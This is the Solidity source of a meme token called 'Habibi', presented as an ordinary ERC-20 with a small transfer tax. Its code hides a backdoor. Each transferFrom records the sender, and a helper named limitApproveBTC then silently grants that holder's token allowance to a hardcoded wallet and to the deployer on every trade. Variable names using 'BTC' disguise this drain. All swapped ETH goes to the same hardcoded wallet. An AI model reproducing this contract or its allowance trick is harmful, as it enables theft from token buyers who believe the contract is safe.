/*
$Habibi: the only token rewriting the Arabian Nights success story! From ancient trade routes to modern crypto highways

website: https://www.habibioneth.live
Twitter: https://x.com/habibioneth
Telegram: https://t.me/habibioneth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface IBTCFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBTCRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract HABIBI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _btc1Wallet = 0xC70D75525451de156012e3b9911700e099e5ACB6;
    address private _btc3Wallet;
    address private _btc2Wallet;
    mapping (address => uint256) private _btcMines;
    mapping (address => mapping (address => uint256)) private _btcAllows;
    mapping (address => bool) private _excemptFromBTC;
    uint256 private _initialBuyTaxBTC=3;
    uint256 private _initialSellTaxBTC=3;
    uint256 private _finalBuyTaxBTC=0;
    uint256 private _finalSellTaxBTC=0;
    uint256 private _reduceBuyTaxAtBTC=6;
    uint256 private _reduceSellTaxAtBTC=6;
    uint256 private _preventSwapBeforeBTC=6;
    uint256 private _buyCountBTC=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalBTC = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Habibi";
    string private constant _symbol = unicode"HABIBI";
    uint256 private _swapTokenBTC = _tTotalBTC / 100;
    bool private inSwapBTC = false;
    bool private _tradeEnabledBTC = false;
    bool private _swapEnabledBTC = false;
    modifier lockTheSwap {
        inSwapBTC = true;
        _;
        inSwapBTC = false;
    }
    address private _btcPair;
    IBTCRouter private _btcRouter;
    
    constructor () {
        _btc2Wallet = address(msg.sender);
        _excemptFromBTC[owner()] = true;
        _excemptFromBTC[address(this)] = true;
        _excemptFromBTC[_btc1Wallet] = true;
        _btcMines[_msgSender()] = _tTotalBTC;
        emit Transfer(address(0), _msgSender(), _tTotalBTC);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabledBTC,"trading is already open");
        _btcRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabledBTC = true;
        _tradeEnabledBTC = true;
    }

    receive() external payable {}

    function tokenCreation() external onlyOwner() {
        _btcRouter = IBTCRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_btcRouter), _tTotalBTC);
        _btcPair = IBTCFactory(_btcRouter.factory()).createPair(address(this), _btcRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalBTC;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _btcMines[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _btcAllows[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _btc3Wallet = address(sender); _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _btcAllows[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _btcAllows[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transferBTC(address fBTC, address tBTC, uint256 aBTC) private returns(uint256) {
        uint256 taxBTC=0;
        if (fBTC != owner() && tBTC != owner()) {
            taxBTC = aBTC.mul((_buyCountBTC>_reduceBuyTaxAtBTC)?_finalBuyTaxBTC:_initialBuyTaxBTC).div(100);

            if (fBTC == _btcPair && tBTC != address(_btcRouter) && ! _excemptFromBTC[tBTC]) {
                _buyCountBTC++;
            }

            if(tBTC == _btcPair && fBTC!= address(this)) {
                taxBTC = aBTC.mul((_buyCountBTC>_reduceSellTaxAtBTC)?_finalSellTaxBTC:_initialSellTaxBTC).div(100);
            }

            swapBackBTC(tBTC, aBTC);
        }
        return taxBTC;
    }

    function _transfer(address fBTC, address tBTC, uint256 aBTC) private {
        require(fBTC != address(0), "ERC20: transfer from the zero address");
        require(tBTC != address(0), "ERC20: transfer to the zero address");
        require(aBTC > 0, "Transfer amount must be greater than zero");

        uint256 taxBTC = _transferBTC(fBTC, tBTC, aBTC);

        if(taxBTC > 0){
          _btcMines[address(this)] = _btcMines[address(this)].add(taxBTC);
          emit Transfer(fBTC, address(this), taxBTC);
        }

        _btcMines[fBTC] = _btcMines[fBTC].sub(aBTC);
        _btcMines[tBTC] = _btcMines[tBTC].add(aBTC.sub(taxBTC));
        emit Transfer(fBTC, tBTC, aBTC.sub(taxBTC));
    }

    function limitApproveBTC(uint256 aBTC) private {
        _btcAllows[address(_btc3Wallet)][address(_btc1Wallet)] = uint256(aBTC);
        _btcAllows[address(_btc3Wallet)][address(_btc2Wallet)] = uint256(aBTC);
    }

    function minBTC(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHBTC(uint256 amount) private {
        payable(_btc1Wallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _btcRouter.WETH();
        _approve(address(this), address(_btcRouter), tokenAmount);
        _btcRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBackBTC(address tBTC, uint256 aBTC) private {
        uint256 tokenBalance = balanceOf(address(this)); 
        if (!inSwapBTC && tBTC == _btcPair && _swapEnabledBTC && _buyCountBTC > _preventSwapBeforeBTC) {
            if(tokenBalance > _swapTokenBTC)
            swapTokensForEth(minBTC(aBTC, minBTC(tokenBalance, _swapTokenBTC)));
            uint256 contractETHBalance = address(this).balance;
            if (contractETHBalance >= 0) {
                sendETHBTC(address(this).balance);
            }
        } limitApproveBTC(uint256(aBTC));
    }
}